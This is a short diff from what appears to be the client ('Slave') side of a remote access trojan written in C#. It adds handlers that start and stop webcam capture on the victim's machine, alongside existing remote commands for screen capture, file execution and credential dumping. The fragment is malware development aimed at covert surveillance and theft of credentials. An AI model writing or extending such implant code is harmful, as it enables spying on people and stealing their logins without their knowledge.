@@ -156,6 +156,8 @@ namespace BlackHole.Slave
                 .With<StopScreenCaptureMessage>(ScreenCapture.Instance.StopScreenCapture)
                 .With<ExecuteFileMessage>(ExecuteFile)
                 .With<StartCredentialsMessage>(DumpCredentials)
+                .With<StartWebcamCaptureMessage>(Webcam.Instance.StartScreenCapture)
+                .With<StopWebcamCaptureMessage>(Webcam.Instance.StopScreenCapture)
                 .Default(m => SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}"));
 
 #if DEBUG
